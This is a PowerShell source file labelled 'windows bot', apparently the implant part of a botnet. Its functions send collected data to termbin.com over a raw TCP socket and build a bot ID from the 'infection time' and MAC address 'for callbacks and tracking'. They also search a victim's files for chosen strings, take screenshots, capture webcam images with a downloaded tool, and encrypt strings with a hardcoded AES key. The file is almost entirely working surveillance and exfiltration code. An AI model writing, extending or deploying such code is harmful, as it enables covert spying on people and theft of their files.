# windows bot 
# find_string test data: $stringarray = "this is a super hard test", "another etest yo"


# Name: 		Send_NetworkData
# Parameters: 	$data, whatever we're sending to termbin.com
# Return value:	None
# Purpose: 		Writes to termbin for us so we don't need to install netcat everywhere
# CREDIT: 		This code was modified from: https://gist.github.com/jstangroome/9adaa87a845e5be906c8/
function Send_NetworkData ($data) {
    begin {
        # establish the connection and a stream writer
		$Encoding = [System.Text.Encoding]::ASCII
        $Client = New-Object -TypeName System.Net.Sockets.TcpClient
        $Client.Connect('termbin.com', '9999')
        $Stream = $Client.GetStream()
        $Writer = New-Object -Type System.IO.StreamWriter -ArgumentList $Stream, $Encoding, $Client.SendBufferSize, $true
    }

    process {
        # send all the input data
        foreach ($Line in $Data) {
            $Writer.WriteLine($Line)
        }
    }

    end {
        # flush and close the connection send
        $Writer.Flush()
        $Writer.Dispose()
        $Client.Client.Shutdown('Send')

        # read the response
        $Stream.ReadTimeout = [System.Threading.Timeout]::Infinite

        $Result = ''
        $Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize
        do {
            try {
                $ByteCount = $Stream.Read($Buffer, 0, $Buffer.Length)
            } catch [System.IO.IOException] {
                $ByteCount = 0
            }
            if ($ByteCount -gt 0) {
                $Result += $Encoding.GetString($Buffer, 0, $ByteCount)
            }
        } while ($Stream.DataAvailable -or $Client.Client.Connected) 

        Write-Output $Result
        
        # cleanup
        $Stream.Dispose()
        $Client.Dispose()
    }
}


# Name:			create_hash
# Parameters:	$str_to_hash (the string we want to hash with sha256)
# Return value:	$hashed (the hashed string)
# Purpose:		create a hash of a string, used for bot uid
function create_hash($str_to_hash){
	$algorithm = new-object System.Security.Cryptography.SHA256Managed
    $toHash = [System.Text.Encoding]::UTF8.GetBytes($str_to_hash)
    $hashByteArray = $algorithm.ComputeHash($toHash)
    foreach($byte in $hashByteArray)
    {
         $hashed += $byte.ToString()
    }
    return $hashed;
}


# Name:			get_uid
# Parameters:	None
# Return value:	$bot_uid (the uid of our bot)
# Purpose:		gets the uid of our bot for callbacks and tracking
function get_uid() {
	# get infection time and then mac address to hash for bot uid
	$date = @(get-date)
	$adapter = @(get-netadapter | select MacAddress | select-object -first 1)
	$mac = $adapter[0].MacAddress # we just want the 1st mac yolosauce
	$to_hash = $date + $mac
	# hash the date+mac
	$bot_uid = create_hash $to_hash
	
	return $bot_uid
}


# Name: 		find_string
# Parameters: 	$string, list of strings we are searching for
# Return value:	returns an object containing the list of files
# Purpose: 		find all files containing a given string
function find_string ($stringarray){
	# get all the files that contain the strings we are searching for and append them to the list $files
	foreach ($str in $stringarray){
		$files += get-ChildItem -recurse | select-string -pattern $str | select-object -Property Filename, Linenumber, Line
	}

	# gets the uid of the bot for the returned data
	$uid = get_uid
	
	# create a blank json object for us to append our findings to
	($json = [pscustomobject]@{})
	
	# add the uid to the object 
	$json | add-member -membertype noteproperty -name uid -value $uid
	for($i=0; $i -le $files.length; $i++){
		$fname = "file" + $i
		$json | add-member -membertype noteproperty -name $fname -value $files[$i]
	}
	
	echo $json |convertto-json
}


# Name:			take_screenshot
# Parameters:	None
# Return value:	$file (path to screenshot on local system)
# Purpose:		takes a screenshot and saves it in the format screenshot_yyyy-mm-dd_H_M_s.
function take_screenshot {
	$file = "C:\Users\whatbatman\screenshot_$(get-date -format yyyy-mm-dd_H_M_s).bmp"

	# get the dimensions of the screen 
	$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
	$width = $screen.Width
	$height = $screen.Height
	$left = $screen.Left
	$top = $screen.Top
	
	# create the bitmap to store the screenshot
	$bitmap = New-Object System.Drawing.Bitmap $width, $height
	$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
	$graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
	$bitmap.Save($file)
	
	return $file
}

# Name:			webcam_capture
# Parameters:	None
# Return:		$file (path to image on local system)
# Purpose:		takes a picture with the webcam. This requires an additional too we will pull down first use
function webcam_capture {
	# If we don't have the application required to screenshot, go get it. Then run it.
	# If we already have it then this test will pass and will just run it.
	#if (-not Test-Path 'C:\Program Files\CommandCam.exe'){
#		wget http://localhost/CommandCam.exe
	#}
	
	$date = Get-Date -format yyyy-mm-dd_H_M_s
	
	.C:\Program Files\CommandCam.exe /filename .pics$date.bmp
	
	return ".pics$date.bmp"
}



# Name:			Create-AesManagedObject
# Parameters:	Key and IV for encryption
# Return value:	the aes oboject $aesManaged
# Purpose:		Creates a powershell object to store our encrypted stuff 
# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

# Name:			Create-AesKey
# Parameters:	None
# Return value:	encryption key in proper object form
# Purpose:		Creates the key for encryption
# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
	
	$enc = [system.Text.Encoding]::UTF8
	$encryption_key = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" #example key 32 chars long
	$byte_key = $enc.GetBytes($encryption_key)
	$aesManaged.Key = $byte_key

    [System.Convert]::ToBase64String($aesManaged.Key)
}

# Name:			Encrypt-String
# Parameters:	the key to encrypt with and the string to encrypt
# Return value:	the encrypted string
# Purpose:		Encrypts a string with a given key
# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

# Name:			Decrypt-String
# Parameters:	the key to decrypt with and the string to decrypt
# Return value:	the decrypted string
# Purpose:		Decrypts a string with a given key
# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

# Name:			perform_encryption
# Parameters:	actually encrypts or decrypts the string. POC of aes code for testing.
# Return value:	the decrypted/encrypted string
# Purpose:		poc for crypto
function perform_encryption($data, $key){
	$key = Create-AesKey

	write-host $key
	$unencryptedString = "blahblahblah"
	$encryptedString = Encrypt-String $key $unencryptedString
	$backToPlainText = Decrypt-String $key $encryptedString

	write-host "[+] encrypted string: $encryptedString"
	write-host "[+] backtoplain: $backToPlainText"
}